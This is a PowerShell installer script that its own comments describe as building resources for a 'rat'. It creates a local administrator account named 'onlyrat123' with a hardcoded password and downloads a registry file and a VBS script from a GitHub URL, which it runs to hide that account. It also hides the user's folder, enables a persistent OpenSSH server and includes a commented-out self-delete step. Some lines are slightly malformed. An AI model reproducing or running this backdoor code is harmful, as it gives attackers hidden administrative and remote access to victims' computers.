#builds resources for rat
# random string for direcories

function random_text {
    -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
}


 #creat local admin
 function Create-NewLocalAdmin {
    [CmdletBinding()]
    param(
        [string]$NewLocalAdmin,
        [securestring]$Password
    )
    begin {
    }
    process {
        New-LocalUser -Name $NewLocalAdmin -Password $Password -FullName $NewLocalAdmin -Description "Temporary Local Admin"
        Write-Verbose "$NewLocalAdmin local user created successfully."
        # Add the user to Administrators group
        Add-LocalGroupMember -Group "Administrators" -Member $NewLocalAdmin
    } 
    end {
    }    
}


#create admin user
$NewLocalAdmin = "onlyrat123"
$Password = (ConvertTo-SecureString "onlyrat123" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

#vriables
$wd = random_text
$path = "$env:TEMP\$wd"
$initial_dir = Get-Location


# goto temp, make working directory
mkdir $path
cd $path
./smtp.ps1

#registry to hide local admin
Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar2/refs/heads/main/wrev.reg?token=GHSAT0AAAAAAC7AO3Q3L2TPI4F4AM7RI46AZ5SQATQ -Outfile "wrev.reg"

# visual basic script to register the registry
Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar2/refs/heads/main/calty.vbs?token=GHSAT0AAAAAAC7AO3Q232F7FQZY4Q5WZKKIZ5SQAZA -Outfile "calty.vbs"

#install the registry
./wrev.reg; ./calty

#hide onlyrat user
cd C:\Users
attrib +h +s +r onlyrat123



#enable persistent ssh
Add-WindowsCapability -Online -Name OpenSSH. Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd
-StartupType 'Automatic'

# self delete
cd $initial_dir
#el installer.ps1
